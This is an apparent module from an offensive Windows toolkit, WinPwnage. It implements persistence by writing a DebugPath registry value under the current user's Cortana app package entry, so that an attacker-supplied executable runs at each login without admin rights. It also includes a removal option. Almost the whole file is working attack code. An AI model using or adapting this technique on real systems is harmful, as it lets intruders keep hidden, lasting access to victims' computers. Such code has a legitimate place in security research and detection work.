try:
	import _winreg   	 # Python 2
except ImportError:      # Python 3
	import winreg as _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *
import os

#https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/

persistMethod9_info = {
	"Description": "Persistence using Cortana windows app",
	"Method": "Registry key (Class) manipulation",
	"Id": "9",
	"Type": "Persistence",
	"Fixed In": "99999",
	"Works From": "14393",
	"Admin": False,
	"Function Name": "persistMethod9",
	"Function Payload": True,
}

def find_cortana():
	index = 0
	cortana_version = []
	
	try:
		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "Software\Classes\ActivatableClasses\Package", 0, _winreg.KEY_READ)
	except Exception as error:
		print_error("Unable to open registry key, exception was raised: {}".format(error))
		return False

	try:
		num = _winreg.QueryInfoKey(key)[0]
		for x in range(0, num):
			if "Microsoft.Windows.Cortana_" in _winreg.EnumKey(key, x):
				cortana_version.append(_winreg.EnumKey(key, x))
				break
	except WindowsError as error:
		pass
	return cortana_version

def persistMethod9(payload, add=True):
	try:
		kpath = os.path.join("Software\Classes\ActivatableClasses\Package",
								find_cortana()[0],
								"DebugInformation\CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca")
	except IndexError:
		print_error("Unable to add persistence, Cortana is unavailable on this system")
		return False

	if add:
		if payloads().exe(payload):
			if registry().modify_key(hkey="hkcu", path=kpath, name="DebugPath", value=payloads().exe(payload)[1], create=True):
				print_success("Successfully created DebugPath key containing payload ({payload})".format(payload=payloads().exe(payload)[1]))
				print_success("Successfully installed persistence, payload will run at login")
			else:
				print_error("Unable to add persistence, exception was raised: {}".format(error))
				return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		if registry().remove_key(hkey="hkcu", path=kpath, name="DebugPath"):
			print_success("Successfully removed persistence")
		else:
			print_error("Unable to remove persistence")
			return False
